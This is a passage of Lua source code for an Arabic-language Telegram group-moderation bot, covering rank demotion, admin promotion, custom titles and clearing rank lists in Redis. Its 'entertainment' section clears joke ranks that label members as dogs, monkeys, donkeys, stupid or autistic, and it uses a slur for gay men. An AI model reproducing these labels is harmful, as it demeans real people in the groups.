Redis:srem(darket.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Supcreator then
if Rink == 3 or Rink < 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Creator then
if Rink == 4 or Rink < 4 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Manger then
if Rink == 5 or Rink < 5 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Admin then
if Rink == 6 or Rink < 6 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
end
return send(msg_chat_id,msg_id,"\n*٠ تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." *}","md",true)  
end

if text and text:match('ضع لقب (.*)') and msg.reply_to_message_id ~= 0 then
local CustomTitle = text:match('ضع لقب (.*)')
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..Message_Reply.sender.user_id.."&can_invite_users=True")
send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم وضع له لقب : "..CustomTitle).Reply,"md",true)  
https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg_chat_id.."&user_id="..Message_Reply.sender.user_id.."&custom_title="..CustomTitle)
end
if text and text:match('^ضع لقب @(%S+) (.*)$') then
local UserName = {text:match('^ضع لقب @(%S+) (.*)$')}
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName[1])
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[1]:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..UserId_Info.id.."&can_invite_users=True")
send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم وضع له لقب : "..UserName[2]).Reply,"md",true)  
https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg_chat_id.."&user_id="..UserId_Info.id.."&custom_title="..UserName[2])
end 
if text == 'لقبي'  then
Ge = https.request("https://api.telegram.org/bot".. Token.."/getChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..msg.sender.user_id)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg_chat_id,msg_id,'*٠ ليس لديك لقب*',"md",true) 
else
send(msg_chat_id,msg_id,'٠ لقبك هو : '..GeId.result.custom_title,"md",true) 
end
end
if text == ('رفع مشرف') and msg.reply_to_message_id ~= 0 then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})
if SetAdmin.code == 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكنني رفعه ليس لدي صلاحيات *","md",true)  
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل الصلاحيات ', data = msg.sender.user_id..'/groupNumseteng//'..Message_Reply.sender.user_id}, 
},
}
}
return send(msg_chat_id, msg_id, "٠صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end
if text and text:match('^رفع مشرف @(%S+)$') then
local UserName = text:match('^رفع مشرف @(%S+)$')
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})

if SetAdmin.code == 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكنني رفعه ليس لدي صلاحيات *","md",true)  
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل الصلاحيات ', data = msg.sender.user_id..'/groupNumseteng//'..UserId_Info.id}, 
},
}
}
return send(msg_chat_id, msg_id, "٠صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end 
if text == ('تنزيل مشرف') and msg.reply_to_message_id ~= 0 then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return send(msg_chat_id,msg_id,"\n*٠لست انا من قام برفعه *","md",true)  
end
if SetAdmin.code == 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكنني تنزيله ليس لدي صلاحيات *","md",true)  
end
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم تنزيله من المشرفين ").Reply,"md",true)  
end
if text and text:match('^تنزيل مشرف @(%S+)$') then
local UserName = text:match('^تنزيل مشرف @(%S+)$')
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return send(msg_chat_id,msg_id,"\n*٠لست انا من قام برفعه *","md",true)  
end
if SetAdmin.code == 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكنني تنزيله ليس لدي صلاحيات *","md",true)  
end
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم تنزيله من المشرفين ").Reply,"md",true)  
end 
if text == 'مسح رسائلي' then
Redis:del(darket..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id)
send(msg_chat_id,msg_id,'٠ تم مسح جميع رسائلك ',"md",true)  
elseif text == 'مسح تعديلاتي' or text == 'مسح تعديلاتي' then
Redis:del(darket..'Num:Message:Edit'..msg.chat_id..':'..msg.sender.user_id)
send(msg_chat_id,msg_id,'٠ تم مسح جميع تعديلاتك ',"md",true)  
elseif text == 'مسح جهاتي' then
Redis:del(darket..'Num:Add:Memp'..msg.chat_id..':'..msg.sender.user_id)
send(msg_chat_id,msg_id,'٠ تم مسح جميع جهاتك المضافه ',"md",true)  
elseif text == 'رسائلي' then
send(msg_chat_id,msg_id,'٠عدد رسائلك هنا *~ '..(Redis:get(darket..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) or 1)..'*',"md",true)  
elseif text == 'تعديلاتي' or text == 'تعديلاتي' then
send(msg_chat_id,msg_id,'٠عدد التعديلات هنا *~ '..(Redis:get(darket..'Num:Message:Edit'..msg.chat_id..msg.sender.user_id) or 0)..'*',"md",true)  
elseif text == 'جهاتي' then
send(msg_chat_id,msg_id,'٠عدد جهاتك المضافه هنا *~ '..(Redis:get(darket.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
elseif text == 'مسح' and msg.reply_to_message_id ~= 0 and msg.Admin then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.reply_to_message_id})
LuaTele.deleteMessages(msg.chat_id,{[1]= msg_id})
end
if text == 'تعين الايدي عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id,240,true)  
return send(msg_chat_id,msg_id,[[
٠ ارسل الان النص
٠يمكنك اضافه :
٠`#username` ٠ اسم المستخدم
٠`#msgs` ٠ عدد الرسائل
٠`#photos` ٠ عدد الصور
٠`#id` ٠ ايدي المستخدم
٠`#auto` ٠ نسبة التفاعل
٠`#stast` ٠ رتبة المستخدم 
٠`#edit` ٠ عدد التعديلات
٠`#game` ٠ عدد النقاط
٠`#AddMem` ٠ عدد الجهات
٠`#Description` ٠ تعليق الصوره
]],"md",true)    
end 
if text == 'حذف الايدي عام' or text == 'مسح الايدي عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Set:Id:Groups")
return send(msg_chat_id,msg_id, '٠ تم ازالة كليشة الايدي العامه',"md",true)  
end

if text == 'تعين الايدي' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id,240,true)  
return send(msg_chat_id,msg_id,[[
٠ ارسل الان النص
٠يمكنك اضافه :
٠`#username` ٠ اسم المستخدم
٠`#msgs` ٠ عدد الرسائل
٠`#photos` ٠ عدد الصور
٠`#id` ٠ ايدي المستخدم
٠`#auto` ٠ نسبة التفاعل
٠`#stast` ٠ رتبة المستخدم 
٠`#edit` ٠ عدد التعديلات
٠`#game` ٠ عدد النقاط
٠`#AddMem` ٠ عدد الجهات
٠`#Description` ٠ تعليق الصوره
]],"md",true)    
end 
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Set:Id:Group"..msg.chat_id)
return send(msg_chat_id,msg_id, '٠ تم ازالة كليشة الايدي ',"md",true)  
end

if text and text:match("^مسح (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^مسح (.*)$")
if TextMsg == 'المطورين الثانوين' or TextMsg == 'المطورين الثانويين' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Devss:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين ثانوين حاليا , ","md",true)  
end
Redis:del(darket.."Devss:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المطورين الثانويين*","md",true)
end
if TextMsg == 'المطورين' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Dev:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
Redis:del(darket.."Dev:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المطورين *","md",true)
end
if TextMsg == 'المنشئين الاساسيين' then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد منشئين اساسيين حاليا , ","md",true)  
end
Redis:del(darket.."Supcreator:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المنشؤين الاساسيين *","md",true)
end
if TextMsg == 'المالكين' then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مالكين حاليا , ","md",true)  
end
Redis:del(darket.."Supcreator:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المالكين *","md",true)
end
if TextMsg == 'المنشئين' then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Creator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد منشئين حاليا , ","md",true)  
end
Redis:del(darket.."Creator:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المنشئين *","md",true)
end
if TextMsg == 'المدراء' then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Manger:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مدراء حاليا , ","md",true)  
end
Redis:del(darket.."Manger:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المدراء *","md",true)
end
if TextMsg == 'الادمنيه' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Admin:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد ادمنيه حاليا , ","md",true)  
end
Redis:del(darket.."Admin:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الادمنيه *","md",true)
end
if TextMsg == 'المميزين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Special:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مميزين حاليا , ","md",true)  
end
Redis:del(darket.."Special:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المميزين *","md",true)
end
----تسلية----
if TextMsg == 'الكلاب' then
local Info_Members = Redis:smembers(darket.."klb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد كلاب حاليا , ","md",true)  
end
Redis:del(darket.."klb:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الكلاب *","md",true)
end
if TextMsg == 'الخولات' then
local Info_Members = Redis:smembers(darket.."kholat:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد خولات حاليا , ","md",true)  
end
Redis:del(darket.."kholat:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الخولات *","md",true)
end
if TextMsg == 'القرود' then
local Info_Members = Redis:smembers(darket.."2rd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد قرود حاليا , ","md",true)  
end
Redis:del(darket.."2rd:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من القرود *","md",true)
end
if TextMsg == 'الاغبياء' then
local Info_Members = Redis:smembers(darket.."8by:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد اغبية حاليا , ","md",true)  
end
Redis:del(darket.."8by:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الاغبياء *","md",true)
end
if TextMsg == 'العرر' then
local Info_Members = Redis:smembers(darket.."3ra:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد عرر حاليا , ","md",true)  
end
Redis:del(darket.."3ra:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من العرر *","md",true)
end
if TextMsg == 'السمب' then
local Info_Members = Redis:smembers(darket.."smb:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد سمباويه حاليا , ","md",true)  
end
Redis:del(darket.."smb:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من السمباويه *","md",true)
end
if TextMsg == 'الحمير' then
local Info_Members = Redis:smembers(darket.."mar:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد حمير حاليا , ","md",true)  
end
Redis:del(darket.."mar:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الحمير *","md",true)
end
if TextMsg == 'المتوحدين' then
local Info_Members = Redis:smembers(darket.."twhd:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد متوحدين حاليا , ","md",true)  
end
Redis:del(darket.."twhd:Group"..msg_chat_id) 
